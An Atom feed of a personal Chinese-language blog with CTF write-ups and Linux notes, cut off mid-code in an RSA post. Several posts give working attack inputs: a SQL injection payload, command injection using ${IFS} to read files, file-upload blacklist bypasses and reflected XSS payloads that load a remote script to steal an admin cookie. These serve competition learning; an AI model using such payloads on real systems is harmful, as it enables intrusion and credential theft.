<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[Hc1m1]]></title>
  
  <link href="/atom.xml" rel="self"/>
  <link href="http://lazysheep.cc/"/>
  <updated>2015-06-05T13:27:45.000Z</updated>
  <id>http://lazysheep.cc/</id>
  
  <author>
    <name><![CDATA[Hc1m1]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[墙网杯总结]]></title>
    <link href="http://lazysheep.cc/2015/06/05/0x27/"/>
    <id>http://lazysheep.cc/2015/06/05/0x27/</id>
    <published>2015-06-05T13:11:53.000Z</published>
    <updated>2015-06-05T13:27:45.000Z</updated>
    <content type="html"><![CDATA[<p><strong>对于上周末的墙网杯总结</strong><br>这次比赛略赛，，全是取证，密码这种题，，，web题就三题，算上js逆向，勉强4题，两题抄的，一个500分，还那么迟放，日不动。。<br><a id="more"></a><br>这次撸出来了四题，第一题密码题，有点烦，懒得写writeup了。。。</p>
<p>web100，是php代码审计吧，.bak下载源码，然后审计，抄袭php4fun的，秒拿一二血。</p>
<p>web200，是改CodeGate 2015 猫头鹰那题，思路基本一致，参考writeup：<a href="https://github.com/pwning/public-writeup/blob/master/codegate2015/web200-owlur/writeup.md" target="_blank" rel="external">https://github.com/pwning/public-writeup/blob/master/codegate2015/web200-owlur/writeup.md</a></p>
<p>逆向100，这题是js逆向，写了一个python脚本跑，贴出脚本：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">ss = <span class="string">"a[11]-a[5]%a[1]*a[12]%a[14]-a[6]*a[7]-a[24]+a[10]%a[13]+a[2]*a[23]+a[21]+a[15]%a[3]%a[19]-a[20]*a[0]%a[17]+a[18]-a[22]+a[8]+a[4]-a[9]+a[25]+a[16]==-161&amp;&amp;a[14]+a[19]%a[20]-a[3]-a[4]+a[5]%a[23]%a[12]%a[21]-a[18]%a[24]%a[0]+a[6]*a[17]-a[7]*a[9]-a[10]+a[8]+a[22]*a[15]%a[16]-a[26]-a[1]%a[11]+a[2]+a[25]+a[13]==-42&amp;&amp;a[34]+a[27]+a[29]-a[10]*a[13]*a[20]%a[31]+a[2]*a[23]-a[0]*a[8]-a[6]*a[9]-a[19]%a[3]+a[15]%a[1]-a[25]-a[26]*a[16]%a[30]-a[17]+a[12]+a[5]-a[33]+a[21]+a[24]*a[14]+a[11]*a[32]-a[22]*a[4]+a[18]+a[28]-a[7]==-56&amp;&amp;a[20]+a[13]%a[4]-a[21]+a[16]-a[12]+a[11]%a[9]%a[3]%a[0]*a[8]%a[2]+a[5]%a[17]+a[15]-a[10]%a[18]-a[6]-a[1]-a[19]*a[7]%a[14]==-76&amp;&amp;a[6]%a[29]+a[4]+a[18]%a[22]+a[16]+a[30]-a[19]*a[21]+a[24]+a[5]-a[34]*a[13]+a[17]*a[11]-a[31]*a[23]+a[14]+a[28]+a[20]-a[10]+a[32]+a[33]%a[12]*a[26]+a[2]%a[15]*a[1]+a[27]*a[25]-a[3]%a[7]%a[8]*a[9]-a[0]+a[35]==-129&amp;&amp;a[1]*a[3]*a[5]%a[6]-a[2]%a[0]+a[4]-a[7]==18&amp;&amp;a[19]+a[20]+a[4]+a[0]-a[17]-a[8]-a[2]*a[7]+a[18]-a[14]-a[3]-a[5]+a[10]-a[11]+a[6]*a[1]%a[13]%a[15]*a[12]-a[9]-a[16]==-36&amp;&amp;a[6]-a[1]+a[4]+a[0]%a[5]%a[2]-a[3]==21&amp;&amp;a[1]-a[5]%a[4]%a[8]%a[3]-a[10]-a[0]%a[7]%a[9]%a[6]-a[2]==-157&amp;&amp;a[9]%a[5]-a[11]+a[7]-a[0]%a[10]*a[4]%a[3]+a[1]-a[6]%a[8]+a[2]==99&amp;&amp;a[1]+a[4]%a[0]%a[3]*a[7]%a[6]-a[8]-a[2]+a[5]==127&amp;&amp;a[8]+a[34]%a[10]%a[4]%a[16]+a[25]+a[15]-a[31]-a[2]*a[3]-a[27]*a[13]%a[23]%a[1]+a[17]*a[26]+a[5]%a[30]+a[35]%a[36]+a[22]%a[7]%a[29]-a[21]+a[28]*a[18]-a[37]+a[38]+a[11]%a[20]+a[9]-a[32]-a[0]*a[14]+a[33]*a[12]+a[24]-a[19]+a[6]==4&amp;&amp;a[2]-a[1]-a[3]+a[0]==-12&amp;&amp;a[6]%a[25]%a[17]+a[24]-a[23]+a[15]%a[31]*a[13]+a[29]-a[12]%a[0]*a[11]-a[27]+a[5]-a[2]-a[10]%a[28]*a[14]-a[8]+a[7]*a[22]+a[26]+a[3]%a[21]+a[32]-a[20]*a[4]+a[30]+a[18]*a[16]-a[9]%a[1]%a[19]==132&amp;&amp;a[17]-a[11]+a[1]-a[0]%a[5]*a[12]%a[13]+a[4]%a[14]-a[10]-a[15]%a[8]%a[7]+a[6]-a[2]%a[16]+a[9]+a[3]==128&amp;&amp;a[28]+a[19]*a[9]+a[26]%a[5]-a[22]+a[3]%a[4]+a[12]%a[0]+a[25]%a[2]%a[13]-a[15]+a[23]%a[21]*a[27]%a[20]%a[16]%a[11]+a[24]%a[7]-a[6]*a[1]-a[14]+a[18]+a[10]%a[8]-a[17]==-43&amp;&amp;a[11]*a[2]%a[19]*a[6]-a[14]+a[32]*a[1]%a[28]-a[3]%a[27]-a[4]+a[13]+a[24]%a[12]-a[10]+a[23]-a[15]%a[0]%a[31]%a[16]-a[17]*a[7]%a[21]%a[20]%a[25]*a[8]+a[22]*a[18]%a[5]-a[26]+a[33]+a[9]%a[30]%a[29]==87&amp;&amp;a[11]*a[17]%a[16]-a[18]%a[13]+a[10]+a[0]%a[5]-a[23]+a[15]*a[21]%a[20]+a[9]+a[7]-a[19]*a[2]-a[24]+a[1]*a[14]+a[6]%a[4]%a[8]%a[3]-a[22]-a[12]==-130&amp;&amp;a[1]-a[3]-a[6]*a[9]%a[13]-a[18]+a[2]*a[12]*a[7]%a[0]-a[16]+a[17]-a[4]*a[5]%a[14]+a[10]*a[11]*a[15]%a[8]==-123&amp;&amp;a[14]-a[26]-a[21]+a[34]%a[15]+a[9]+a[19]%a[13]+a[36]+a[18]%a[11]*a[12]%a[30]+a[29]+a[31]%a[17]-a[5]*a[24]*a[20]%a[8]%a[22]-a[4]-a[25]%a[10]-a[6]-a[3]-a[0]*a[23]%a[35]+a[28]%a[16]%a[32]%a[2]+a[33]-a[1]*a[27]%a[7]==-75&amp;&amp;a[31]%a[38]+a[23]%a[33]-a[10]*a[3]+a[5]+a[35]-a[20]%a[27]*a[13]+a[30]%a[14]*a[1]%a[6]+a[37]%a[4]-a[26]*a[21]-a[7]-a[36]-a[16]*a[0]+a[28]*a[34]*a[42]*a[41]%a[9]-a[15]+a[19]*a[24]+a[11]*a[17]+a[39]%a[32]+a[43]+a[18]*a[2]-a[12]-a[25]-a[29]-a[22]+a[8]*a[40]==123&amp;&amp;a[4]*a[3]%a[2]%a[0]-a[5]+a[1]==48&amp;&amp;a[25]-a[30]+a[16]-a[37]-a[21]*a[36]*a[4]%a[11]+a[32]-a[29]%a[34]-a[2]+a[20]%a[1]+a[10]-a[33]+a[0]%a[19]-a[22]+a[8]+a[13]%a[31]+a[17]%a[24]%a[7]+a[26]-a[3]%a[14]%a[12]*a[5]%a[18]-a[23]*a[6]%a[28]+a[15]-a[35]+a[27]%a[9]==21&amp;&amp;a[2]-a[4]+a[3]%a[0]+a[1]==83&amp;&amp;a[7]*a[21]*a[12]%a[3]-a[17]-a[38]+a[23]+a[6]%a[28]%a[27]%a[14]%a[39]+a[13]+a[32]+a[40]-a[4]-a[8]%a[11]%a[25]*a[31]+a[20]*a[24]%a[29]%a[34]*a[30]%a[33]%a[5]-a[26]*a[18]%a[2]+a[10]+a[36]*a[9]%a[37]*a[19]-a[15]*a[1]%a[35]%a[22]%a[16]-a[0]==75&amp;&amp;a[27]*a[29]*a[11]%a[8]-a[24]*a[16]+a[10]%a[2]%a[7]*a[6]+a[23]+a[0]+a[4]*a[22]-a[30]+a[12]-a[17]%a[5]%a[1]*a[15]-a[19]*a[20]-a[3]-a[9]-a[13]+a[25]*a[18]%a[14]+a[26]%a[28]*a[21]==19&amp;&amp;a[45]-a[9]%a[42]-a[0]+a[44]%a[20]*a[13]-a[38]%a[36]*a[17]+a[24]+a[31]+a[28]-a[7]%a[16]*a[39]*a[25]*a[1]%a[14]*a[41]-a[18]-a[4]-a[3]%a[10]+a[23]%a[12]+a[37]*a[29]%a[2]+a[30]-a[22]+a[32]%a[34]+a[33]+a[8]%a[26]*a[11]*a[15]%a[40]%a[5]%a[19]-a[21]+a[43]%a[6]*a[35]+a[27]==-76&amp;&amp;a[7]+a[9]+a[1]-a[11]*a[5]*a[3]%a[12]-a[13]-a[4]-a[6]+a[8]%a[2]%a[0]%a[10]==-84&amp;&amp;a[0]-a[1]==-6&amp;&amp;a[2]-a[6]%a[8]+a[7]-a[4]-a[1]%a[3]+a[9]-a[5]+a[0]==50&amp;&amp;a[44]-a[24]+a[25]%a[30]%a[41]*a[3]-a[23]+a[20]*a[38]+a[15]-a[43]+a[8]-a[29]*a[9]+a[27]+a[33]-a[39]*a[18]%a[0]+a[7]-a[6]-a[42]-a[2]+a[31]+a[4]-a[32]*a[40]-a[22]+a[13]+a[34]%a[17]*a[14]%a[37]+a[36]-a[10]*a[5]%a[11]*a[19]+a[12]+a[16]%a[35]*a[21]+a[28]-a[26]-a[1]==-44&amp;&amp;a[9]%a[3]%a[7]%a[0]%a[4]-a[2]-a[11]-a[12]+a[6]-a[5]%a[10]+a[8]-a[1]==-187&amp;&amp;a[8]%a[7]+a[6]-a[14]-a[4]%a[17]+a[11]-a[12]%a[5]%a[2]+a[15]-a[9]%a[10]*a[13]%a[0]-a[18]+a[19]+a[16]-a[3]-a[1]==-7&amp;&amp;a[12]%a[3]+a[15]-a[0]-a[11]+a[13]+a[4]*a[2]%a[1]-a[10]-a[5]+a[9]+a[6]%a[7]*a[8]%a[14]==-22&amp;&amp;a[4]+a[16]+a[10]+a[5]-a[7]-a[11]-a[9]%a[13]-a[1]-a[12]%a[2]*a[14]%a[8]%a[6]+a[3]-a[15]%a[0]==97&amp;&amp;a[0]*a[1]%a[11]*a[14]%a[10]+a[5]+a[7]%a[13]-a[4]%a[19]-a[15]-a[8]%a[18]%a[21]%a[12]%a[17]-a[3]%a[9]-a[6]+a[20]+a[16]+a[22]-a[2]==112&amp;&amp;a[0]==102&amp;&amp;a[2]+a[0]-a[1]==91&amp;&amp;a[5]*a[4]%a[12]+a[18]+a[27]+a[22]+a[21]-a[10]-a[25]-a[20]%a[7]+a[14]%a[17]%a[23]+a[19]*a[13]%a[26]-a[1]*a[3]%a[8]+a[24]-a[6]+a[16]+a[0]-a[9]-a[15]%a[2]-a[11]==163&amp;&amp;a[8]*a[10]*a[4]*a[21]%a[26]*a[6]%a[14]+a[22]*a[5]+a[18]-a[25]-a[7]-a[11]+a[23]-a[9]*a[15]-a[2]+a[28]%a[17]*a[1]%a[0]-a[3]%a[16]-a[12]*a[20]+a[29]+a[27]%a[24]%a[19]-a[13]==-46&amp;&amp;a[21]-a[36]-a[16]+a[28]-a[3]%a[1]+a[35]-a[8]-a[30]+a[29]%a[19]+a[39]-a[2]+a[24]*a[11]%a[34]%a[15]%a[38]%a[12]-a[33]+a[20]%a[14]-a[18]-a[31]+a[5]%a[10]+a[7]+a[4]%a[26]*a[23]+a[27]-a[6]*a[37]%a[17]*a[25]%a[9]%a[22]-a[0]*a[13]%a[32]==184&amp;&amp;a[38]*a[34]%a[30]-a[31]+a[26]-a[27]-a[16]%a[0]-a[18]%a[24]%a[29]%a[12]+a[20]-a[15]*a[7]+a[17]-a[13]-a[36]-a[25]%a[8]*a[22]+a[6]-a[35]%a[39]+a[9]%a[3]%a[10]%a[19]*a[37]+a[40]%a[28]+a[41]-a[2]*a[23]*a[4]%a[1]-a[32]%a[14]%a[11]*a[21]%a[5]+a[33]==167&amp;&amp;a[13]-a[6]%a[5]-a[0]%a[9]+a[21]+a[23]+a[18]%a[17]%a[16]%a[7]-a[20]%a[1]*a[15]%a[19]%a[8]*a[2]%a[22]-a[14]%a[11]%a[10]*a[4]%a[3]+a[12]==155&amp;&amp;a[23]+a[26]%a[17]%a[20]*a[39]-a[7]-a[0]-a[27]*a[15]+a[25]%a[18]%a[16]%a[42]%a[32]+a[6]*a[14]-a[2]-a[36]+a[35]+a[29]+a[34]-a[31]-a[5]+a[41]%a[3]*a[13]*a[10]%a[12]-a[21]*a[38]%a[24]-a[46]+a[33]%a[4]%a[11]*a[40]%a[44]+a[28]-a[22]%a[30]+a[8]-a[19]-a[1]*a[43]*a[37]%a[45]+a[9]==183&amp;&amp;a[22]%a[18]+a[12]*a[23]-a[41]*a[17]+a[15]-a[5]%a[25]-a[14]%a[16]-a[3]+a[36]+a[1]-a[42]+a[26]%a[39]%a[10]+a[28]%a[27]-a[7]-a[30]-a[19]%a[2]+a[32]%a[0]-a[6]+a[11]-a[13]%a[35]*a[29]-a[4]*a[24]*a[37]%a[40]+a[31]%a[33]*a[38]-a[21]+a[8]*a[34]%a[20]*a[9]==39&amp;&amp;a[6]%a[0]*a[9]%a[2]%a[4]%a[10]-a[14]+a[13]%a[11]-a[8]%a[5]+a[7]+a[12]+a[1]-a[3]==163&amp;&amp;a[13]-a[15]+a[23]*a[17]*a[27]%a[8]-a[14]%a[22]-a[29]*a[5]%a[25]+a[4]%a[10]-a[19]%a[7]%a[12]%a[11]+a[20]+a[31]+a[18]+a[21]*a[30]%a[1]%a[28]+a[0]%a[26]+a[6]%a[24]%a[3]-a[2]-a[16]-a[9]==147"</span></span><br><span class="line">sss = ss.split(<span class="string">'&amp;&amp;'</span>)</span><br><span class="line"></span><br><span class="line">u = []</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; len(sss):</span><br><span class="line">	o = sss[i]</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(i,len(sss)):</span><br><span class="line">		<span class="keyword">if</span> len(sss[j]) &lt; len(o):</span><br><span class="line">			o = sss[j]</span><br><span class="line">	sss.remove(o)</span><br><span class="line">	u.append(o)</span><br><span class="line">cc = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> u:</span><br><span class="line">	j = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">254</span>):</span><br><span class="line">		a = cc[:]</span><br><span class="line">		a.append(j)</span><br><span class="line">		<span class="keyword">if</span> eval(i):</span><br><span class="line">			cc.append(j)</span><br><span class="line">			<span class="keyword">break</span>	</span><br><span class="line">		</span><br><span class="line">		</span><br><span class="line"><span class="keyword">print</span> cc</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cc:</span><br><span class="line">	flag += chr(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure></p>
<p>至于密码学的题目，，简直醉了，，看了writeup也不懂，，，哎</p>
]]></content>
    <summary type="html">
    <![CDATA[<p><strong>对于上周末的墙网杯总结</strong><br>这次比赛略赛，，全是取证，密码这种题，，，web题就三题，算上js逆向，勉强4题，两题抄的，一个500分，还那么迟放，日不动。。<br>]]>
    
    </summary>
    
      <category term="CTF" scheme="http://lazysheep.cc/tags/CTF/"/>
    
      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Linux笔记]]></title>
    <link href="http://lazysheep.cc/2015/05/24/0x26/"/>
    <id>http://lazysheep.cc/2015/05/24/0x26/</id>
    <published>2015-05-24T05:20:10.000Z</published>
    <updated>2015-06-05T14:13:01.000Z</updated>
    <content type="html"><![CDATA[<p><strong>最近在看鸟哥的私房菜，服务器架设篇，做些笔记。</strong><br><a id="more"></a></p>
<p>1.发现一个好玩的:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$vim</span> /etc/hosts</span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span>        localhost     //这就是为什么localhost等同于<span class="number">127.0</span>.<span class="number">0.1</span>的原因</span><br><span class="line"><span class="number">192.168</span>.<span class="number">1.1</span>    hahaha　　//所以我突发奇想加了一个这个，ping hahaha　就相当于ping <span class="number">192.168</span>.<span class="number">1.1</span></span><br><span class="line">//这是因为在linux系统上，用户请求连接一个非ip地址，系统第一会先来这个文件查找，没找到再请求DNS</span><br><span class="line"></span><br><span class="line">//不过有些问题，如果是中文，浏览器访问不了。</span><br></pre></td></tr></table></figure></p>
<p>2.<code>ping -s xxx ip</code>  //-s用来指定发送的数据包的大小，可以用来检测网络的最大MTU.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eg:</span><br><span class="line"><span class="variable">$ping</span> -c <span class="number">2</span> <span class="operator">-s</span> <span class="number">1000</span> -M <span class="keyword">do</span> <span class="number">192.168</span>.<span class="number">1.254</span></span><br></pre></td></tr></table></figure></p>
<p>3.发现个好玩的，平常运行py脚本都是给脚本执行权限(以a.py举例)，然后再执行:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ chmod +x a.py</span><br><span class="line">$ ./a.py</span><br></pre></td></tr></table></figure></p>
<p>然后今天发现一个命令，”.”执行脚本，没有执行权限也可以:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ . ./a.py</span><br><span class="line"><span class="comment">#还有source，，不过太长了，与点的区别在于有返回值。。。不过我还是喜欢点。简短。</span></span><br><span class="line">$ <span class="built_in">source</span> a.py</span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[<p><strong>最近在看鸟哥的私房菜，服务器架设篇，做些笔记。</strong><br>]]>
    
    </summary>
    
      <category term="Linux" scheme="http://lazysheep.cc/tags/Linux/"/>
    
      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[渗透题writeup]]></title>
    <link href="http://lazysheep.cc/2015/05/20/0x25/"/>
    <id>http://lazysheep.cc/2015/05/20/0x25/</id>
    <published>2015-05-20T05:40:32.000Z</published>
    <updated>2015-05-20T08:16:33.000Z</updated>
    <content type="html"><![CDATA[<p><strong>平台上两道渗透题writeup</strong><br><a id="more"></a></p>
<h2 id="0x0_FuckMySQL1(Rank:300)">0x0 FuckMySQL1(Rank:300)</h2><blockquote>
<p>Hint: 是渗透题！这是渗透题！虽然也有web的成分！但是这是渗透题！！！</p>
</blockquote>
<p>打开题目链接，会随机出现一张图片，图片库中有９张，就是说９张中随机出现一张（不过这些no egg use）</p>
<p>这题我是用扫描器扫到一个admina.php文件，不过正规的思路应该是试着访问 ‘robots.txt’，然后从中发现admina.php</p>
<p>然后是一个登录界面，，用户名是lightless，密码靠社工，或者爆破吧。６位纯数字密码，开头是9</p>
<p>然后跳转到新页面，（这里我发现，如果用扫描器直接扫到这个页面，就可以跳过前面的登录界面。。）</p>
<p>从　管理员的TODO LIST　中得知一个新页面信息，然后用的是vim编辑器</p>
<p>跳到新页面，因为用的是vim，所以尝试php后面加~   成功下载当前页面的源码，然后就是代码审计了</p>
<p>需要post给后台两个值：key1 &amp; key2。。。</p>
<p>数据库中查询key1的值，因为并不知道key1是多少，所以这里用注入 ｀’=’’｀，</p>
<p>需要返回一行数据，经过实验，表中只有一行数据，所以只要注入成功就好了，然后需要返回的key2值等于你输入的key2值，，但是我们并不知道key2值。。。所以这里需要黑魔法</p>
<p>这里的黑魔法是 <code>group by xxx with rollup</code> ，，要是我自己，，怎么也想不到’with rollup’这鬼东西，，还是ak大神告诉我的。。。</p>
<p>接着就是需要返回一行，而且是第二行的数据，用到limit，所以payload为: <code>key1=&#39;=&#39;&#39; group by key2 with rollup limit 1 offset 1%23&amp;key2=</code></p>
<p>GET Flag!</p>
<h2 id="0x0_FuckMySQL2(Rank:200)">0x0 FuckMySQL2(Rank:200)</h2><blockquote>
<p>Hint: 是渗透题！这是渗透题！虽然也有web的成分！但是这是渗透题！！！</p>
</blockquote>
<p>上题flag下面有这题的提示，base32解密，然后得知前面的那张猫的图片有猫腻。。</p>
<p>下载到本地，在linux系统中直接用命令<code>strings　图片</code>，，得到一个新页面</p>
<p>然后是命令行注入，研究了半天，知道把空格过滤了。。可是我linux的修为还是太差了。。并不知道什么可以代替空格。。。</p>
<p>然后又是ak大神告诉了我一个黑魔法’${IFS}’</p>
<p>所以是<code>127.0.0.||ls${IFS}img</code></p>
<p>看到img文件夹中又flag文件。</p>
<p>然后就是<code>127.0.0.||cat${IFS}img/flag</code></p>
<p>GET Flag~~</p>
<p>Summary:两题渗透题，让我学到了三个东西<code>with rollup</code> &amp;&amp; <code>offset</code> &amp;&amp; <code>${IFS}</code></p>
]]></content>
    <summary type="html">
    <![CDATA[<p><strong>平台上两道渗透题writeup</strong><br>]]>
    
    </summary>
    
      <category term="CTF" scheme="http://lazysheep.cc/tags/CTF/"/>
    
      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CUIT总结]]></title>
    <link href="http://lazysheep.cc/2015/05/19/0x24/"/>
    <id>http://lazysheep.cc/2015/05/19/0x24/</id>
    <published>2015-05-19T03:25:02.000Z</published>
    <updated>2015-05-20T07:47:13.000Z</updated>
    <content type="html"><![CDATA[<p><strong>上个周末的CUIT好多渗透题，，可是一题也没撸出来，但是看完writeup后，学到了好多姿势，，这里做一个总结。。</strong><br><a id="more"></a></p>
<h2 id="PT1:">PT1:</h2><blockquote>
<p>这题的第一步都没撸出来。。。第一步是找源码。。看完writeup后才知道，源码在 ‘.DS_Store’ 中。。。</p>
<p>‘.DS_Store’ 是MAC(OSX系统)的默认备份文件(╮（╯▽╰）╭。。用不起MAC。。)</p>
</blockquote>
<p>至今在CTF中遇到的备份文件：</p>
<blockquote>
<ul>
<li>Linux : xxx.php　—&gt;  xxx.php~ || .xxx.php.swp</li>
<li>bak的后缀 —&gt; xxx.xxx.bak</li>
<li>有时候还可以试试压缩文件 —&gt; xxx.rar || xxx.zip</li>
<li>还有就是这次遇到MAC系统中的 ‘.DS_Store’ —&gt; 保存的是该目录下的特殊信息，针对的是文件夹，而不是文件</li>
</ul>
</blockquote>
<h2 id="PT2:">PT2:</h2><blockquote>
<p>JAVA的题，并不会。。。。</p>
</blockquote>
<h2 id="PT3">PT3</h2><blockquote>
<p>修为不够，，并不明白</p>
</blockquote>
<h2 id="PT4">PT4</h2><blockquote>
<p>这题是文件上传漏洞，有了黑名单过滤，一直在想怎么绕过。。。可是并没撸出来。。。看了writeup后，，才知道要用 ‘:’ 截断绕过，这个比较迷，冒号我是试过的，我构造的文件名是这样的: ‘flag.php:.jpg’ 可是there is no egg use…writeup中的文件名是: ‘flag.php:1’ …迷一样的绕过。。</p>
<p>然后得到了另一种黑魔法: ‘flag.php::$DATA’ 据说这样也可以绕过黑名单，不过这题过滤了 ‘$’ 所以这个没用。</p>
<p>还有一个也许不是黑魔法，毕竟我没用过iis :</p>
</blockquote>
<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在php + iis + <span class="built_in">window</span>　环境下：</span><br><span class="line">双引号(<span class="string">'"'</span>) &lt;=<span class="function">=&gt;</span> 点号(<span class="string">"."</span>);</span><br><span class="line">大于号(<span class="string">"&gt;"</span>) &lt;=<span class="function">=&gt;</span> 问号(<span class="string">"?"</span>);</span><br><span class="line">小于号(<span class="string">"&lt;"</span>) &lt;=<span class="function">=&gt;</span> 星号(<span class="string">"*"</span>);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>在window环境下，上传了flag.php后，再上传flag.ph<em>(flag.</em>hp…之类)，将会自动匹配 ‘*’ ,然后覆盖 ‘flag.php’ 文件</p>
</blockquote>
<h2 id="PT5">PT5</h2><blockquote>
<p>这题第一步是一个很简单的万能密码。。。可是我连第一步都没撸出来。。<br>我认为这题我最大的问题就是没把渗透题和web题结合起来，一开始我就被这题是渗透题影响，试了一个’or 1#失败后就没在尝试了，(这题把or还有注释符过滤了，所以前面的payload当然不行，需要把or换成||)潜意识就觉得渗透题不会像web题一样，会出现这么明显的注入点。。。<br>这里顺便说说我理解的web和渗透：web —&gt; 日一点　;  渗透 —&gt; 找一点then去日;</p>
</blockquote>
<h2 id="PT6">PT6</h2><blockquote>
<p>这题一开始就提示了，这题是实战。。目前为止，我就撸过两次声称是实战的比赛，一次是ALICTF还有一次就是这次的CUIT了。。。。</p>
</blockquote>
<p>来说说就我理解的实战题：</p>
<blockquote>
<ul>
<li>扫目录，扫端口，扫旁站，爆破</li>
<li>社工</li>
<li>web</li>
</ul>
</blockquote>
<p>实战其实就相当于是日站的步骤吧，一个大型的网站，不可能一眼就被你看出漏洞，这时候就需要我们去寻找这个网站的短板</p>
<blockquote>
<p>这题我感觉比较坑，我做的基本和writeup中的一样，找到了一个反射型XSS，发给管理员，可是管理员却说我的链接让他的浏览器奔溃了。。。什么鬼。。。writeup中跟我用同一个payload都成功得到cookie了。。。。。。心累～～～</p>
</blockquote>
<p>＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝update＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝</p>
<p>研究了下，知道问题出在哪了，，还是我js学的不行。。<br>my payload: ?movieName=”])}catch(e){if(!window.x){window.x=1;document.write(‘<script src="//baidu.com"></script>‘)}}//</p>
<p>writeup payload: ?movieName=”])}catch(e){if(!window.x){window.x=1;document.body.appendChild(document.createElement(‘script’)).src=’//baidu.com’}}//</p>
<p>｀document.write()｀会重写html，在有的浏览器我的payload可以(貌似只有firefox可以)</p>
<p>而writeup中的payload是添加一个节点，在当前页面的基础上添加。。。所以说问题就在这了。。。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p><strong>上个周末的CUIT好多渗透题，，可是一题也没撸出来，但是看完writeup后，学到了好多姿势，，这里做一个总结。。</strong><br>]]>
    
    </summary>
    
      <category term="CTF" scheme="http://lazysheep.cc/tags/CTF/"/>
    
      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[fuck RSA writeup]]></title>
    <link href="http://lazysheep.cc/2015/04/21/0x23/"/>
    <id>http://lazysheep.cc/2015/04/21/0x23/</id>
    <published>2015-04-21T13:22:00.000Z</published>
    <updated>2015-04-21T13:44:34.000Z</updated>
    <content type="html"><![CDATA[<p>不会加密，全靠看别人的flag<br><a id="more"></a><br>题目描述中给出密文c：<code>0x1e04304936215de8e21965cfca9c245b1a8f38339875d36779c0f123c475bc24d5eef50e7d9ff5830e80c62e8083ec55f27456c80b0ab26546b9aeb8af30e82b650690a2ed7ea407dcd094ab9c9d3d25a93b2140dcebae1814610302896e67f3ae37d108cd029fae6362ea7ac1168974c1a747ec9173799e1107e7a56d783660418ebdf6898d7037cea25867093216c2c702ef3eef71f694a6063f5f0f1179c8a2afe9898ae8dec5bb393cdffa3a52a297cd96d1ea602309ecf47cd009829b44ed3100cf6194510c53c25ca7435f60ce5f4f614cdd2c63756093b848a70aade002d6bc8f316c9e5503f32d39a56193d1d92b697b48f5aa43417631846824b5e86</code></p>
<p>然后给了一个下载链接，下载下来的fuckrsa改名为fuckrsa.pub.xz，解压得到公钥fuckrsa.pub</p>
<p>然后。。。。发现密文和公钥和BCTF中warmup题的一模一样，，所以解出来的也一样。。。。然后底下都是靠看大神的writeup，，给个链接<br><a href="http://rickgray.me/2015/03/23/bctf2015-writeup.html" target="_blank" rel="external">http://rickgray.me/2015/03/23/bctf2015-writeup.html</a></p>
<p>先是用以下命令，得到Modulus和Exponent：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 